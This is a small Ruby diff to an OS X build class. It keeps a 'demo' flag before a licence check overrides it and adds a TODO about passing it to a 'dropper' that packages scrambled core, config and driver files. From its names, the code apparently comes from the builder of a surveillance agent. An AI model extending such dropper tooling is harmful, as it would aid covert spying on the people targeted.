@@ -25,6 +25,9 @@ class BuildOSX < Build
     params[:core] = 'core'
     params[:config] = 'config'
 
+    # remember the demo parameter
+    @demo = params['demo']
+
     # overwrite the demo flag if the license doesn't allow it
     params['demo'] = true unless LicenseManager.instance.limits[:agents][:osx][0]
 
@@ -106,6 +109,7 @@ class BuildOSX < Build
       end
     end
 
+    # TODO: add the demo parameter for the dropper here
     CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                         path(@scrambled[:config])+' '+
                                         path(@scrambled[:driver])+' '+
